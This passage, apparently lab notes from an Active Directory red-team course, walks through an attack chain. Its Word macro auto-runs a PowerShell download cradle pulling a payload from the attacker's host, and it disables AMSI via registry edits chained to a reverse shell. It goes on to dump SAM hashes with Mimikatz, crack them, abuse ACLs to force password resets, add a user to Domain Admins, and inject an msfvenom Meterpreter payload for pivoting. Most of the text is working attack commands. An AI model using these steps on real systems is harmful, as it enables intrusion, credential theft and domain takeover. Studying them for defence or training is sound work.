+<p>Disable AMSI and Gain reverse shell:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AMSI = anti malware scanning interface from windows
+</code></pre></div></div>
+
+<blockquote>
+  <p>we are gonna use FodHelper to break it.</p>
+</blockquote>
+
+<p>Covenant:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- make sure ip address is correct and you paste the revshell payload from covenant
+- We need to host a file (in this case banana.txt) in covenant
+</code></pre></div></div>
+
+<p><strong>banana.txt content</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iex (New-Object Net.WebClient).DownloadString('http://&lt;kali ip&gt;/helper.ps1');helper -custom "cmd.exe /c powershell New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse; cmd.exe /c &lt;powershell reverse shell&gt;"
+</code></pre></div></div>
+
+<p><strong>Benefits.doc - Macro Word File</strong>:</p>
+<pre><code class="language-macro">Sub FruitLoops()
+  Dim wsh As Object
+  Set wsh = CreateObject("WScript.Shell")
+  wsh.Run "powershell iex (New-Object Net.WebClient).DownloadString('http://&lt;kali ip&gt;/banana.txt')"
+  Set wsh = Nothing
+End Sub
+Sub AutoOpen()
+  FruitLoops
+End Sub
+</code></pre>
+
+<p>We need to host 2 files - the exploit and the helper.ps1:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Listener <span class="o">&gt;</span> host <span class="o">&gt;</span> /banana.txt <span class="o">&gt;</span> browser <span class="o">&gt;</span> <span class="k">select </span>file <span class="o">&gt;</span> create
+Listener <span class="o">&gt;</span> host <span class="o">&gt;</span> /helper.ps1 <span class="o">&gt;</span> browser <span class="o">&gt;</span> <span class="k">select </span>file <span class="o">&gt;</span> create
+</code></pre></div></div>
+
+<p>in Workstation-01:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://&lt;kali ip&gt;/banana.txt'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Windows defender will not get our exploit, cause we bypassed
+we should get high integrity shell in Covenant</p>
+</blockquote>
+
+<p>in Covenant Shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami
+</span>Mimikatz token::elevate lsadump:sam
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Go back to workstation-01 &gt; rename back to the original file
+ &gt; register &gt; HKLM\software\microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
+</code></pre></div></div>
+
+<ul>
+  <li>c:\Shared\Benefits.doc = the malicious macro file</li>
+</ul>
+
+<blockquote>
+  <p>it will change de register file again. and we will gain shell from covenant again</p>
+</blockquote>
+
+<h1 id="domain-enumeration">Domain Enumeration</h1>
+
+<h2 id="downloading-files">Downloading Files</h2>
+
+<ul>
+  <li>With Powershell</li>
+</ul>
+
+<p>In Covenant:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Listeners <span class="o">&gt;</span> Hosted Files <span class="o">&gt;</span> Create <span class="o">&gt;</span> /powerview.ps1 <span class="o">&gt;</span> browser <span class="o">&gt;</span> <span class="k">select </span>PowerView.ps1 <span class="o">&gt;</span> Create
+</code></pre></div></div>
+
+<p>Download the hosted File:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="nx">/powerview.ps1</span><span class="w"> </span><span class="nx">powerview.ps1</span><span class="w">
+</span><span class="n">wget</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="nx">/powerview.ps1</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">powerview.ps1</span><span class="w">
+</span><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://&lt;kali ip&gt;/powerview.ps1'</span><span class="p">);</span><span class="nx">get-netcomputer</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>iex does not download the file, however it loads into memory. 
+so we can execute commands of powerview in this case.</p>
+</blockquote>
+
+<h2 id="enumerating-users">Enumerating Users</h2>
+<p>First download powerview.ps1:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">get-netuser</span><span class="w">
+</span><span class="nx">get-netuser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">cn</span><span class="w">
+</span><span class="n">get-netuser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-expandproperty</span><span class="w"> </span><span class="nx">samaccountname</span><span class="w">
+</span><span class="n">find-userfield</span><span class="w"> </span><span class="nt">-SearchField</span><span class="w"> </span><span class="nx">description</span><span class="w"> </span><span class="s2">"password"</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Enumeration Local Admin Users:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-EnumerateLocalAdmin</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="enumerating-groups">Enumerating Groups</h2>
+<p><strong>powerview.ps1</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">get-netgroup</span><span class="w">
+</span><span class="nx">get-netgroup</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="s2">"&lt;user&gt;"</span><span class="w">
+</span><span class="n">get-netgroup</span><span class="w"> </span><span class="nt">-GroupName</span><span class="w"> </span><span class="s2">"&lt;group&gt;"</span><span class="w"> </span><span class="nt">-FullData</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="enumerating-domain-computers">Enumerating Domain Computers</h2>
+<p><strong>powerview.ps1</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">get-netcomputer</span><span class="w">
+</span><span class="nx">get-netcomputer</span><span class="w"> </span><span class="nt">-Full-Data</span><span class="w">
+</span><span class="n">get-NetComputer</span><span class="w"> </span><span class="nt">-OperatingSystem</span><span class="w"> </span><span class="s2">"*Windows 10"</span><span class="w">
+</span><span class="n">get-NetComputer</span><span class="w"> </span><span class="nt">-OperatingSystem</span><span class="w"> </span><span class="s2">"*server"</span><span class="w"> 
+</span></code></pre></div></div>
+
+<p><strong>Shares</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-ShareFinder</span><span class="w">
+</span><span class="nx">Invoke-ShareFinder</span><span class="w"> </span><span class="nt">-ExcludeStandard</span><span class="w"> </span><span class="nt">-ExcludePrint</span><span class="w"> </span><span class="nt">-ExcludeIPC</span><span class="w">
+</span></code></pre></div></div>
+<p><strong>Files</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-FileFinder</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="enum-gpo--acl">Enum GPO / ACL</h2>
+
+<p>Enumerating Group Policy Objects (GPO):</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">get-netgpo</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Enumerating Access Control Lists (ACL):</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">get-objectacl</span><span class="w">
+</span><span class="nx">get-objectacl</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="s2">"engineering"</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">sales</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">group</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+
+</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">group</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user</span><span class="w"> </span><span class="nx">you</span><span class="w"> </span><span class="nx">wanna</span><span class="w"> </span><span class="nx">delete</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">group</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/del</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">group</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user</span><span class="w"> </span><span class="nx">you</span><span class="w"> </span><span class="nx">wanna</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">group</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>If we can add another user to some group, we can add ourselves to a group to gain access to files/directories</p>
+</blockquote>
+
+<p>Enumerating the Domain:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">get-netdomain</span><span class="w">
+</span><span class="nx">get-domainpolicy</span><span class="w">
+</span><span class="n">get-domainsid</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="powershell-remoting">Powershell Remoting</h2>
+
+<p>Login another machine remotely:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">workstation-02</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain\user</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Executing a command remotely:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">whoami</span><span class="p">;</span><span class="n">hostname</span><span class="p">}</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="n">pc</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain\user</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<h1 id="movement-pivoting-and-persistence-in-the-domain">Movement, Pivoting and Persistence in the Domain</h1>
+
+<h2 id="necessary-domain-misconfigurations">Necessary Domain Misconfigurations</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">in </span>DC <span class="o">&gt;</span> folders <span class="o">&gt;</span> delegate control <span class="o">&gt;</span> add IT admin group <span class="o">&gt;</span> check all delegations.
+
+GPO manager <span class="o">&gt;</span> computer <span class="o">&gt;</span> Policies <span class="o">&gt;</span> Administrative Templates <span class="o">&gt;</span> System <span class="o">&gt;</span> Credential Delegation
+Restrict delegation of credentials to remote server <span class="o">&gt;</span> disabled
+</code></pre></div></div>
+
+<h2 id="overview-bloodhound">Overview Bloodhound</h2>
+
+<blockquote>
+  <p>Bloohound is a good tool to show us a visual landscape of the domain network.
+it shows the hierarchy connection between nodes until the domain controller</p>
+</blockquote>
+
+<p>in Covenant shell ( medium integrity ):</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ChangeDirectory</span><span class="w"> </span><span class="nx">C:\Users\Public</span><span class="w">
+</span><span class="n">upload</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">path</span><span class="o">=</span><span class="n">C:\users\public\sharphound.exe</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">browse</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">select</span><span class="w"> </span><span class="nx">SharpHound.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="bloodhound">Bloodhound</h3>
+<p>In Covenant:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shell</span><span class="w"> </span><span class="nx">sharphound.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">capture</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">objects</span><span class="w">
+</span><span class="n">sharphound</span><span class="w"> </span><span class="nx">saves</span><span class="w"> </span><span class="nx">into</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">zip</span><span class="w"> </span><span class="nx">file</span><span class="p">,</span><span class="w"> </span><span class="nx">go</span><span class="w"> </span><span class="nx">ahead</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">name</span><span class="w">
+</span><span class="n">download</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">bloodhound.zip</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">click</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">inside</span><span class="w"> </span><span class="nx">covenant</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">file</span><span class="w">
+</span></code></pre></div></div>
+
+<p>in kali:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">apt</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">bloodhound</span><span class="w"> </span><span class="nx">neo4j</span><span class="w">
+</span><span class="n">neo4j</span><span class="w"> </span><span class="nx">console</span><span class="w">
+</span><span class="n">go</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">localhost:7474</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">change</span><span class="w"> </span><span class="nx">de</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="n">default</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">neo4j</span><span class="p">:</span><span class="n">neo4j</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span><span class="n">bloodhound</span><span class="w">
+</span></code></pre></div></div>
+
+<p>In BloodHound:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">drag</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">drop</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">bloodhound.zip</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">got</span><span class="w"> </span><span class="nx">earlier</span><span class="w">
+</span><span class="n">Database</span><span class="w"> </span><span class="nx">info</span><span class="w">
+</span><span class="n">Analysis</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Find</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">Admins</span><span class="w">
+</span><span class="n">Analysis</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Find</span><span class="w"> </span><span class="nx">Shortest</span><span class="w"> </span><span class="nx">Paths</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Admins</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">click</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="nx">GenericAll</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">help</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">abuse</span><span class="w"> </span><span class="nx">info</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="abusing-acls">Abusing ACLs</h2>
+<p>upload powerview_dev,ps1 to the target windows machine</p>
+
+<p>load <strong>powerview_dev</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\powerview_dev.ps1</span><span class="w">
+</span><span class="nx">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user1</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">engineering</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user1</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">/domain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="nx">are</span><span class="w"> </span><span class="nx">adding</span><span class="w"> </span><span class="nx">our</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">another</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">gain</span><span class="w"> </span><span class="nx">more</span><span class="w"> </span><span class="nx">access</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"IT ADMINS"</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user1</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">/domain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gaining</span><span class="w"> </span><span class="nx">more</span><span class="w"> </span><span class="nx">access</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>How to know which group to add ourselves?
+with bloodhound, it shows which group has <strong>genericAll access</strong>, that allow us to move laterally within groups until there is another set of vulnerabilities we can exploit</p>
+</blockquote>
+
+<p>Now that we have more access, we are gonna force a password change by another user:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'password of user1'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'domain\user1'</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w">
+</span><span class="nv">$UserPass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password123!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user2</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$UserPass</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$cred</span><span class="w">
+
+</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user2</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+</span><span class="c"># I can see that user2 is a member of Administrator, he has WriteDacl rights to DC</span><span class="w">
+
+</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dc01</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain\user2</span><span class="err">&gt;</span><span class="w">
+</span><span class="c"># We just opened a session in DC with the new credentials we created by force of user2</span><span class="w">
+</span></code></pre></div></div>
+
+<p>In this new Covenant DC01 session:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"Domain admins"</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user2</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user2</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>We are part of domain admins group in the DC</p>
+</blockquote>
+
+<h2 id="pivoting-through-remote-desktop-via-compromised-host">Pivoting through Remote Desktop via Compromised Host</h2>
+<p>Create a local account For <user2> first, grant local admin privileges, and then log in as **user2** locally. This will simulate the user as a help desk/technician logging in to service the machine and the hash being cached</user2></p>
+
+<p><strong>Log as user2 in workstation-01</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&gt;</span><span class="w"> </span><span class="n">logout</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">log</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">user1</span><span class="w">
+
+</span><span class="n">open</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">administrator</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">send</span><span class="w"> </span><span class="nx">revshell</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">Covenant</span><span class="w"> </span><span class="nx">listener</span><span class="w"> 
+</span><span class="c"># because we need high integrity shell</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>in Covenant shell</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mimikatz</span><span class="w"> </span><span class="nx">token::elevate</span><span class="w"> </span><span class="nx">lsadump::sam</span><span class="w">
+</span><span class="n">grab</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">hashes</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">user2</span><span class="w">
+</span><span class="n">crack</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">hashes</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">john</span><span class="w"> </span><span class="nx">hashes.txt</span><span class="w"> </span><span class="nt">--format</span><span class="o">=</span><span class="n">nt</span><span class="w"> </span><span class="nt">-w</span><span class="o">=</span><span class="n">/rockyou.txt</span><span class="w">
+
+</span><span class="n">Now</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">user2</span><span class="w">
+</span><span class="n">we</span><span class="w"> </span><span class="nx">can</span><span class="w"> </span><span class="nx">pivot</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="s1">'user1-workstation-01'</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="s1">'user2-workstation-02'</span><span class="w">
+</span><span class="c"># we can log in user1 and RDP to user2 For example</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Now that we are inside workstation-02 using user2
+we can pivot to DC01 using user2 because he has access; we can see that in Bloodhound</p>
+</blockquote>
+
+<h2 id="configuring-reverse-port-forward">Configuring Reverse Port Forward</h2>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msfvenom</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">windows/x64/meterpreter/reverse_tcp</span><span class="w"> </span><span class="nx">lhost</span><span class="o">=</span><span class="err">&lt;</span><span class="n">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lport</span><span class="o">=</span><span class="mi">25</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="n">raw</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">msf.bin</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>In Metasploit</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span><span class="w"> </span><span class="nx">exploit/multi/handler</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">options</span><span class="w">
+</span><span class="n">exploit</span><span class="w"> </span><span class="nt">-j</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>In Covenant</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Launchers</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net40</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="nx">Listener</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">encoded</span><span class="w"> </span><span class="nx">payload</span><span class="w">
+</span><span class="n">Grunts</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">high</span><span class="w"> </span><span class="nx">integrity</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ps</span><span class="w">
+</span><span class="n">find</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">SessionID</span><span class="err">&gt;</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nx">doesnt</span><span class="w"> </span><span class="nx">need</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">authority\system</span><span class="w">
+</span><span class="n">inject</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">PID</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">msf.bin</span><span class="w">
+
+</span><span class="c"># a wild session appears in msf</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Meaning behind that:</p>
+
+<blockquote>
+  <p>we have covenant session, but we found another network and want to portfwd to enum these networks.
+So we will pass the session to meterpreter via covenant, we dont have GUI access here.
+In meterpreter session we can run autoroute, portfwd and SOCKS.</p>
+</blockquote>
+
+<p><strong>In Meterpreter session</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ipconfig</span><span class="w">
+</span><span class="nx">run</span><span class="w"> </span><span class="nx">autoroute</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target</span><span class="w"> </span><span class="nx">network/24</span><span class="err">&gt;</span><span class="w"> 
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>the target network is one that we dont have access and we need this portfwd to gain that</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">run</span><span class="w"> </span><span class="nx">autoroute</span><span class="w"> </span><span class="nt">-p</span><span class="w">
+</span><span class="n">portfwd</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">2222</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">443</span><span class="w"> </span><span class="nt">-L</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">portfwd</span><span class="w">
+</span><span class="nx">background</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctrl</span><span class="o">+</span><span class="nx">z</span><span class="w">
+
